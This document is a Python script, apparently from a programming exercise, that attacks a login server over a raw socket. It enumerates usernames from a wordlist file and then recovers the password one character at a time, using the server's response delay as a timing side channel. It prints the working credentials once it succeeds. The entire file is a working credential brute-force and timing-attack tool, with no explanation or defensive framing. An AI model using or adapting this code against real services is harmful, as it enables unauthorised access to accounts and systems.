import socket
import sys
import json
import time

HOST = sys.argv[1]
PORT = int(sys.argv[2])


with socket.socket() as client_socket:
    hostname = HOST
    port = PORT
    address = (hostname, port)
    client_socket.connect(address)

    with open('C:\\logins.txt', 'r', encoding='utf-8') as login:

        # login_valid = ""
        dict_login = {}
        f = []
        dict_login_t = {}
        for word_ in login:
            word_s = word_.strip("\n")
            dict_login["login"] = word_s
            dict_login["password"] = " "
            n = json.dumps(dict_login)

            z = n.encode()
            client_socket.send(z)

         
            response = client_socket.recv(1024)
           
            response = response.decode()
            v = json.loads(response)

            if v["result"] == "Wrong password!":
                login_valid = word_s

            else:
                continue

            
            t = ""
            while True:

                list_char_ = 'abcdefghijklmnopqrstuvwxyz'

                list_char = list_char_ + list_char_.upper() + "0123456789"

                g = list_char
                for i in g:
                    q = t + i

                    dict_login_t["login"] = login_valid
                    dict_login_t["password"] = q
                    nt = json.dumps(dict_login_t)

                    zt = nt.encode()

                    client_socket.send(zt)
                    start_ = time.perf_counter()
                    response = client_socket.recv(1024)
                    finish_ = time.perf_counter()
                    period = finish_ - start_
                    response = response.decode()
                    vt = json.loads(response)

                    # if period > 0.1:
                    #     print(period, t)

                    if vt["result"] == "Connection success!":
                        print(nt)
                        exit()

                    elif period > 0.1:

                        t = q

                        break

                    elif vt["result"] == "Wrong password!":
                        continue

                    else:
                        exit()









